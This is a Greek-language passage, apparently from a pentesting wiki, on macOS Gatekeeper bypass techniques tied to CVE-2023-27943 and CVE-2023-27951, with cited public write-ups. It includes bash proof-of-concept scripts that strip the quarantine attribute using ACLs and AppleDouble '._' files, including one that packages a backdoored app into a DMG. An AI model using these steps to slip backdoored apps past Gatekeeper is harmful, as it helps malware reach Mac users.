Ελέγξτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) για περισσότερες πληροφορίες.

Σημειώστε ότι αυτό θα μπορούσε επίσης να εκμεταλλευτείται με το AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Ανακαλύφθηκε ότι **το Google Chrome δεν έθετε το χαρακτηριστικό καραντίνας** σε ληφθέντα αρχεία λόγω ορισμένων εσωτερικών προβλημάτων του macOS.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

Τα αρχεία μορφής AppleDouble αποθηκεύουν τα χαρακτηριστικά ενός αρχείου σε ένα ξεχωριστό αρχείο που ξεκινά με `._`, κάτι που βοηθά στην αντιγραφή χαρακτηριστικών αρχείων **μεταξύ μηχανημάτων macOS**. Ωστόσο, παρατηρήθηκε ότι μετά την αποσυμπίεση ενός αρχείου AppleDouble, το αρχείο που ξεκινά με `._` **δεν έλαβε το χαρακτηριστικό καραντίνας**.
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

Μπορώντας να δημιουργήσετε ένα αρχείο που δεν θα έχει ορισθεί η ιδιότητα καραντίνας, **ήταν δυνατό να παρακάμψετε το Gatekeeper.** Το κόλπο ήταν να **δημιουργήσετε ένα αρχείο εφαρμογής DMG** χρησιμοποιώντας το συμβολισμό ονομασίας AppleDouble (ξεκινώντας με `._`) και να δημιουργήσετε ένα **ορατό αρχείο ως σύμβολο σε αυτό το κρυφό** αρχείο χωρίς την ιδιότητα καραντίνας.\
Όταν το **αρχείο dmg εκτελείται**, καθώς δεν έχει ιδιότητα καραντίνας, θα **παρακάμψει το Gatekeeper**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Αποτροπή Χαρακτηριστικού Καραντίνας xattr

Σε ένα πακέτο ".app", εάν το χαρακτηριστικό καραντίνας xattr δεν προστεθεί σε αυτό, όταν το εκτελέσετε **ο Gatekeeper δεν θα ενεργοποιηθεί**.
